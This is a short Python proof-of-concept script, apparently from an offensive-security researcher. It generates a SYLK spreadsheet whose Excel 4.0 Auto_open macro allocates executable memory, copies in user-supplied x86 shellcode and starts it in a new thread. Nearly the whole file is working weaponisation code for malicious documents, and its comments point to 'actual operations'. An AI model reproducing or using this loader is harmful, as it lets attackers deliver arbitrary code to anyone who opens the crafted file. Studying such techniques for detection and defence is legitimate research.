#!/usr/bin/python3

# PoC Python code to create a SYLK file with Excel4 shellcode loader.
#
# Author: Stan Hegt (@StanHacked)
#
# Just a proof of concept. Needs polishing before use in actual operations.
# Or as Adam Chester would put it: "RWX for this POC, because... yolo"
#
# Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

import sys

SYLK_TEMPLATE = """ID;P
O;E
NN;NAuto_open;ER1C1
C;X1;Y1;ER1C2()
C;X1;Y2;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
C;X1;Y3;ESELECT(R1C2:R1000:C2,R1C2)
C;X1;Y4;ESET.VALUE(R1C3, 0)
C;X1;Y5;EWHILE(LEN(ACTIVE.CELL())>0)
C;X1;Y6;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
C;X1;Y7;ESET.VALUE(R1C3, R1C3 + 1)
C;X1;Y8;ESELECT(, "R[1]C")
C;X1;Y9;ENEXT()
C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
C;X1;Y11;EHALT()
"""

def shellcode_to_sylk(shellcode_path):
	sylk_output = SYLK_TEMPLATE

	charinline = 0
	cell = 1

	with open(shellcode_path, "rb") as f:
		byte = f.read(1)
		while byte != b"":
			if charinline == 0:
				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
				cell += 1
			else:
				sylk_output+=("&")
			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
			byte = f.read(1)
			charinline += 1
			if charinline == 20:
				sylk_output += ("\n")
				charinline = 0
	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
	return sylk_output

if len(sys.argv) < 2:
	print("Usage: ./shellcode_to_sylk.py file.bin")
	print("file.bin should contain x86 shellcode without null bytes.")	
else:
	print(shellcode_to_sylk(sys.argv[1]))